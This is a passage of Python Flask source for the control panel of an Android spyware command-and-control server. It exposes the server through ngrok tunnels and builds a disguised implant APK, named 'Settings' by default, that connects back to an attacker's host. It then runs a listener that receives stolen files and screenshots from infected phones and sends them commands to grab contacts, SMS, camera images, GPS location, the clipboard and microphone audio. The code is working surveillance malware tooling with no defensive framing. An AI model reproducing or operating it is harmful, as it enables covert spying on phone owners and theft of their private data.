def _ngrok_api_tunnels():
    try:
        r = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels', timeout=3)
        return json.loads(r.read().decode())
    except:
        return None

@app.route('/api/ngrok/start', methods=['POST'])
def api_ngrok_start():
    global ngrok_proc
    data = request.get_json() or {}
    port = int(data.get('port', 7777))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400

    with ngrok_proc_lock:
        if ngrok_proc and ngrok_proc.poll() is None:
            return jsonify({'error': 'Ngrok already running'}), 400

        try:
            ngrok_proc = subprocess.Popen(
                ['ngrok', 'tcp', str(port), '--log=stdout'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(2)
            tunnels = _ngrok_api_tunnels()
            if tunnels and tunnels.get('tunnels'):
                t = tunnels['tunnels'][0]
                pub = t['public_url'].replace('tcp://', '')
                host, p = pub.rsplit(':', 1)
                return jsonify({'started': True, 'host': host, 'port': int(p), 'tunnel': pub})
            return jsonify({'started': True, 'host': None, 'port': None, 'tunnel': None})
        except FileNotFoundError:
            ngrok_proc = None
            return jsonify({'error': 'ngrok not installed or not in PATH'}), 500
        except Exception as e:
            ngrok_proc = None
            return jsonify({'error': str(e)}), 500

@app.route('/api/ngrok/stop', methods=['POST'])
def api_ngrok_stop():
    global ngrok_proc
    with ngrok_proc_lock:
        if ngrok_proc and ngrok_proc.poll() is None:
            ngrok_proc.terminate()
            try:
                ngrok_proc.wait(timeout=5)
            except:
                ngrok_proc.kill()
            ngrok_proc = None
            return jsonify({'stopped': True})
        ngrok_proc = None
        return jsonify({'stopped': True})

@app.route('/api/ngrok/status')
def api_ngrok_status():
    tunnels = _ngrok_api_tunnels()
    if tunnels and tunnels.get('tunnels'):
        t = tunnels['tunnels'][0]
        pub = t['public_url'].replace('tcp://', '')
        host, p = pub.rsplit(':', 1)
        return jsonify({
            'running': True,
            'host': host,
            'port': int(p),
            'tunnel': pub,
            'config': t.get('config', {}),
        })
    with ngrok_proc_lock:
        if ngrok_proc and ngrok_proc.poll() is None:
            return jsonify({'running': True, 'host': None, 'port': None, 'tunnel': None})
    return jsonify({'running': False, 'host': None, 'port': None, 'tunnel': None})

# --- APK Builder (Android Implant) ---

APK_BUILDER_DIR = os.path.join(BASE_DIR, 'apk_builder')
apk_build_status = {'running': False, 'last_output': '', 'success': False, 'apk_path': '', 'apk_name': ''}

@app.route('/api/apk/build', methods=['POST'])
def api_apk_build():
    global apk_build_status
    if apk_build_status['running']:
        return jsonify({'error': 'APK build already running'}), 400

    icon_path = None
    if request.content_type and 'multipart/form-data' in request.content_type:
        c2_host = request.form.get('c2_host', '').strip()
        c2_port = int(request.form.get('c2_port', 8080))
        apk_name = request.form.get('apk_name', 'cyberdemon_c2').strip() or 'cyberdemon_c2'
        target_url = request.form.get('target_url', '').strip() or 'https://www.google.com'
        app_name = request.form.get('app_name', 'Settings').strip() or 'Settings'
        icon_file = request.files.get('icon')
        if icon_file:
            icon_dir = os.path.join(APK_BUILDER_DIR, 'icons')
            os.makedirs(icon_dir, exist_ok=True)
            icon_path = os.path.join(icon_dir, 'custom_icon.png')
            icon_file.save(icon_path)
    else:
        data = request.get_json() or {}
        c2_host = data.get('c2_host', '').strip()
        c2_port = int(data.get('c2_port', 8080))
        apk_name = data.get('apk_name', 'cyberdemon_c2').strip() or 'cyberdemon_c2'
        target_url = data.get('target_url', '').strip() or 'https://www.google.com'
        app_name = data.get('app_name', 'Settings').strip() or 'Settings'

    if not c2_host:
        return jsonify({'error': 'c2_host required'}), 400

    apk_name = re.sub(r'[^a-zA-Z0-9._-]', '_', apk_name)
    apk_build_status = {'running': True, 'last_output': '', 'success': False, 'apk_path': '', 'apk_name': ''}

    def apk_build_thread():
        global apk_build_status
        try:
            gen_script = os.path.join(APK_BUILDER_DIR, 'generate_apk.py')
            apk_out = os.path.join(APK_BUILDER_DIR, f'{apk_name}.apk')
            cmd = [sys.executable, gen_script, '--c2-host', c2_host, '--c2-port', str(c2_port),
                   '--target-url', target_url, '--app-name', app_name, '--output', apk_out]
            if icon_path and os.path.isfile(icon_path):
                cmd.extend(['--icon', icon_path])
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=300, cwd=APK_BUILDER_DIR)
            output = r.stdout + r.stderr
            success = r.returncode == 0 and os.path.isfile(apk_out)
            apk_build_status.update({
                'running': False,
                'last_output': output or ('Build succeeded' if success else 'Unknown error'),
                'success': success,
                'apk_path': apk_out if success else '',
                'apk_name': os.path.basename(apk_out) if success else '',
            })
        except Exception as e:
            apk_build_status.update({'running': False, 'last_output': str(e), 'success': False})

    t = threading.Thread(target=apk_build_thread, daemon=True)
    t.start()
    return jsonify({'started': True, 'c2_host': c2_host, 'c2_port': c2_port, 'target_url': target_url, 'app_name': app_name, 'apk_name': apk_name})

@app.route('/api/apk/status')
def api_apk_status():
    return jsonify(apk_build_status)

@app.route('/api/apk/download')
def api_apk_download():
    if apk_build_status['success'] and os.path.isfile(apk_build_status['apk_path']):
        return send_file(apk_build_status['apk_path'], as_attachment=True,
                         download_name=apk_build_status.get('apk_name', 'cyberdemon_c2.apk'))
    return jsonify({'error': 'No built APK available'}), 404

# --- Android Builder Page ---

@app.route('/android')
def android_builder():
    return render_template('android.html')

# --- Embedded Android Reverse Shell Listener ---

import select as _select
import base64 as _b64

android_listeners = {}
android_listener_lock = threading.Lock()

ANDROID_UPLOADS_DIR = os.path.join(BASE_DIR, 'android_clients')
os.makedirs(ANDROID_UPLOADS_DIR, exist_ok=True)

def _android_handle_client(conn, addr, state, client_id):
    addr_str = f"{addr[0]}:{addr[1]}"
    with state['lock']:
        if client_id in state['clients']:
            # Reuse existing client entry on reconnection
            state['clients'][client_id]['conn'] = conn
            state['clients'][client_id]['connected'] = True
            state['clients'][client_id]['addr'] = addr_str
            state['clients'][client_id]['output'] = []
            print(f"[+] Client {client_id} reconnected from {addr_str}")
        else:
            state['clients'][client_id] = {
                'conn': conn, 'addr': addr_str, 'id': client_id,
                'output': [], 'connected': True,
            }
        state['output'].append({'type': 'system', 'data': f'[+] Connected: {addr_str} ({client_id})'})

    client_dir = os.path.join(ANDROID_UPLOADS_DIR, client_id)
    os.makedirs(client_dir, exist_ok=True)

    try:
        buf = b""
        while not state['stop_event'].is_set():
            r, _, _ = _select.select([conn], [], [], 1.0)
            if not r:
                continue
            data = conn.recv(65536)
            if not data:
                with state['lock']:
                    state['output'].append({'type': 'system', 'data': f'[-] Disconnected: {addr_str}'})
                break

            buf += data
            while b'\n' in buf:
                line, buf = buf.split(b'\n', 1)
                text = line.decode(errors='replace').strip()
                if not text:
                    continue

                if text.startswith('FILEDATA:'):
                    parts = text[9:].split(':', 1)
                    if len(parts) == 2:
                        fname, b64data = parts
                        try:
                            file_bytes = _b64.b64decode(b64data)
                            save_path = os.path.join(client_dir, fname)
                            with open(save_path, 'wb') as f:
                                f.write(file_bytes)
                            with state['lock']:
                                state['output'].append({
                                    'type': 'file', 'data': f'[+] Downloaded: {fname} ({len(file_bytes)} bytes)',
                                    'file_path': save_path, 'file_name': fname, 'file_size': len(file_bytes),
                                })
                        except Exception as e:
                            with state['lock']:
                                state['output'].append({'type': 'error', 'data': f'Decode error: {e}'})
                elif text.startswith('SCREENSHOT:'):
                    parts = text[10:].split(':', 1)
                    if len(parts) == 1:
                        # Screenshot data without filename
                        b64data = parts[0]
                        try:
                            file_bytes = _b64.b64decode(b64data)
                            fname = f"screenshot_{__import__('time').strftime('%H%M%S')}.png"
                            save_path = os.path.join(client_dir, fname)
                            with open(save_path, 'wb') as f:
                                f.write(file_bytes)
                            with state['lock']:
                                state['output'].append({
                                    'type': 'screenshot', 'data': f'[+] Screenshot saved: {fname} ({len(file_bytes)} bytes)',
                                    'file_path': save_path, 'file_name': fname, 'file_size': len(file_bytes),
                                })
                        except Exception as e:
                            with state['lock']:
                                state['output'].append({'type': 'error', 'data': f'Screenshot decode error: {e}'})
                elif text.startswith('SCREENSHOT_ERR:'):
                    with state['lock']:
                        state['output'].append({'type': 'error', 'data': f'Screenshot failed: {text[14:]}'})
                elif text.startswith('RESULT:'):
                    with state['lock']:
                        state['output'].append({'type': 'output', 'data': text[7:]})
                elif text.startswith('ERR:'):
                    with state['lock']:
                        state['output'].append({'type': 'error', 'data': text[4:]})
                else:
                    with state['lock']:
                        state['output'].append({'type': 'output', 'data': text})

    except Exception as e:
        with state['lock']:
            state['output'].append({'type': 'error', 'data': str(e)})
    finally:
        try:
            conn.close()
        except:
            pass
        with state['lock']:
            if client_id in state['clients']:
                state['clients'][client_id]['connected'] = False
                state['clients'][client_id]['conn'] = None

def _android_accept_loop(port, stop_ev, state):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)
    try:
        server.bind(('0.0.0.0', port))
    except Exception as e:
        with state['lock']:
            state['error'] = str(e)
            state['running'] = False
        return
    server.listen(5)
    with state['lock']:
        state['ready'] = True
        state['output'].append({'type': 'system', 'data': f'[*] Listening on port {port}...'})

    client_counter = 0
    while not stop_ev.is_set():
        try:
            conn, addr = server.accept()
        except socket.timeout:
            continue
        except:
            break

        # Check if there's an existing client from this IP (reconnection)
        existing_client_id = None
        with state['lock']:
            for cid, c in state['clients'].items():
                if c['addr'].split(':')[0] == addr[0]:
                    existing_client_id = cid
                    break

        if existing_client_id:
            client_id = existing_client_id
            print(f"[+] Reusing client_id {client_id} for reconnection from {addr[0]}")
        else:
            client_counter += 1
            client_id = f"android_{addr[0].replace('.', '_')}_{client_counter}"

        t = threading.Thread(
            target=_android_handle_client,
            args=(conn, addr, state, client_id),
            daemon=True
        )
        t.start()

    server.close()
    with state['lock']:
        state['running'] = False
        state['ready'] = False

@app.route('/api/android-listener/start', methods=['POST'])
def api_android_listener_start():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400

    with android_listener_lock:
        if port in android_listeners and android_listeners[port].get('running'):
            return jsonify({'error': f'Already listening on {port}'}), 400

        stop_ev = threading.Event()
        state = {
            'running': True, 'ready': False, 'port': port,
            'clients': {}, 'output': [], 'error': None,
            'lock': threading.Lock(), 'stop_event': stop_ev,
        }
        t = threading.Thread(target=_android_accept_loop, args=(port, stop_ev, state), daemon=True)
        t.start()
        android_listeners[port] = state

    return jsonify({'started': True, 'port': port})

@app.route('/api/android-listener/stop', methods=['POST'])
def api_android_listener_stop():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    with android_listener_lock:
        state = android_listeners.pop(port, None)
    if state:
        state['stop_event'].set()
        with state['lock']:
            for cid, c in state['clients'].items():
                try:
                    if c.get('conn'):
                        c['conn'].close()
                except:
                    pass
        return jsonify({'stopped': True, 'port': port})
    return jsonify({'error': 'Not running'}), 400

@app.route('/api/android-listener/status')
def api_android_listener_status():
    port = request.args.get('port', 8080, type=int)
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'running': False, 'port': port})
    with state['lock']:
        connected_clients = []
        for cid, c in state['clients'].items():
            if c.get('connected'):
                connected_clients.append({'id': cid, 'addr': c['addr']})
        return jsonify({
            'running': state['running'], 'ready': state.get('ready', False),
            'port': state['port'], 'error': state.get('error'),
            'clients': connected_clients,
            'client_count': len(connected_clients),
            'output_count': len(state['output']),
        })

@app.route('/api/android-listener/output')
def api_android_listener_output():
    port = request.args.get('port', 8080, type=int)
    since = request.args.get('since', 0, type=int)
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'output': [], 'count': 0})
    with state['lock']:
        return jsonify({
            'output': state['output'][since:],
            'count': len(state['output']),
        })

@app.route('/api/android-listener/send', methods=['POST'])
def api_android_listener_send():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    client_id = data.get('client_id', '')
    text = data.get('text', '')
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400
    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
            conn = c['conn'] if c else None
        else:
            conn = None
            for cid, c in state['clients'].items():
                if c.get('connected') and c.get('conn'):
                    conn = c['conn']
                    client_id = cid
                    break
    if not conn:
        return jsonify({'error': 'No device connected'}), 400
    try:
        # Convert common commands to implant format (uppercase for special commands)
        cmd_lower = text.strip().lower()
        cmd_map = {
            'screenshot': 'SCREENSHOT',
            'contacts': 'CONTACTS',
            'sms': 'SMS',
            'camera': 'CAMERA',
            'gps': 'GPS',
            'clipboard': 'CLIPBOARD',
            'info': 'INFO',
            'listfiles': 'LISTFILES',
            'audio_start': 'AUDIO_START',
            'audio_stop': 'AUDIO_STOP',
            'vibrate': 'VIBRATE',
            'wifi': 'WIFI',
            'ping': 'PING',
        }
        if cmd_lower in cmd_map:
            text = cmd_map[cmd_lower]
        conn.sendall((text + '\n').encode())
        with state['lock']:
            state['output'].append({'type': 'cmd', 'data': text, 'client_id': client_id})
        return jsonify({'sent': True, 'client_id': client_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android-listener/upload', methods=['POST'])
def api_android_listener_upload():
    port = int(request.form.get('port', 8080))
    client_id = request.form.get('client_id', '')
    remote_path = request.form.get('remote_path', '/sdcard/')
    upload_file = request.files.get('file')
    if not upload_file:
        return jsonify({'error': 'No file provided'}), 400

    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400

    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
            conn = c['conn'] if c else None
        else:
            conn = None
            for cid, c in state['clients'].items():
                if c.get('connected') and c.get('conn'):
                    conn = c['conn']
                    client_id = cid
                    break
    if not conn:
        return jsonify({'error': 'No device connected'}), 400

    try:
        file_data = upload_file.read()
        b64 = _b64.b64encode(file_data).decode()
        fname = upload_file.filename
        if remote_path.endswith('/'):
            remote_path = remote_path + fname
        cmd = f"UPLOAD:{remote_path}:{b64}"
        conn.sendall((cmd + '\n').encode())
        with state['lock']:
            state['output'].append({'type': 'cmd', 'data': f'UPLOAD -> {remote_path} ({len(file_data)} bytes)', 'client_id': client_id})
        return jsonify({'sent': True, 'remote_path': remote_path, 'size': len(file_data)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android-listener/download', methods=['POST'])
def api_android_listener_download():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    client_id = data.get('client_id', '')
    file_path = data.get('path', '')
    if not file_path:
        return jsonify({'error': 'No path'}), 400

    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400

    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
            conn = c['conn'] if c else None
        else:
            conn = None
            for cid, c in state['clients'].items():
                if c.get('connected') and c.get('conn'):
                    conn = c['conn']
                    client_id = cid
                    break
    if not conn:
        return jsonify({'error': 'No device connected'}), 400

    try:
        conn.sendall((f"DOWNLOAD:{file_path}\n").encode())
        with state['lock']:
            state['output'].append({'type': 'cmd', 'data': f'DOWNLOAD: {file_path}', 'client_id': client_id})
        return jsonify({'sent': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android-listener/files')
def api_android_listener_files():
    port = request.args.get('port', 8080, type=int)
    client_id = request.args.get('client_id', '')
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'files': []})
    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
        else:
            c = None
            for cid, cl in state['clients'].items():
                if cl.get('connected'):
                    c = cl
                    break
    if not c:
        return jsonify({'files': []})

    client_dir = os.path.join(ANDROID_UPLOADS_DIR, client_id or 'unknown')
    files = []
    if os.path.isdir(client_dir):
        for f in os.listdir(client_dir):
            fp = os.path.join(client_dir, f)
            if os.path.isfile(fp):
                files.append({'name': f, 'size': os.path.getsize(fp), 'path': fp})
    return jsonify({'files': files, 'client_id': client_id})

# Screenshots endpoints
@app.route('/api/android-listener/screenshots')
def api_android_listener_screenshots():
    port = request.args.get('port', 8080, type=int)
    client_id = request.args.get('client_id', '')
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'screenshots': []})

    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
        else:
            c = None
            for cid, cl in state['clients'].items():
                if cl.get('connected'):
                    c = cl
                    break

    if not c:
        return jsonify({'screenshots': []})

    client_dir = os.path.join(ANDROID_UPLOADS_DIR, client_id or 'unknown')
    screenshots = []
    if os.path.isdir(client_dir):
        for f in os.listdir(client_dir):
            if f.startswith('screenshot_') and f.endswith('.png'):
                fp = os.path.join(client_dir, f)
                if os.path.isfile(fp):
                    screenshots.append({'name': f, 'size': os.path.getsize(fp)})
    screenshots.sort(key=lambda x: x['name'], reverse=True)
    return jsonify({'screenshots': screenshots})

@app.route('/api/android-listener/screenshot-file')
def api_android_listener_screenshot_file():
    port = request.args.get('port', 8080, type=int)
    client_id = request.args.get('client_id', '')
    name = request.args.get('name', '')
    if not name or not name.startswith('screenshot_') or not name.endswith('.png'):
        return jsonify({'error': 'Invalid screenshot name'}), 400

    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400

    client_dir = os.path.join(ANDROID_UPLOADS_DIR, client_id or 'unknown')
    fp = os.path.join(client_dir, name)
    if not os.path.isfile(fp):
        return jsonify({'error': 'Screenshot not found'}), 404

    return send_file(fp, mimetype='image/png', as_attachment=False)

if __name__ == '__main__':
    lst = _load_listeners()
    if not lst:
        # default on first run
        lst = [{'port': 7777, 'enabled': True}]
        _save_listeners(lst)
    for entry in lst:
        if entry.get('enabled', True):
            _start_listener(entry['port'])
    print(f"[*] Web UI at http://0.0.0.0:5000")
    print(f"[*] C2 listeners: {[e['port'] for e in lst]}")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
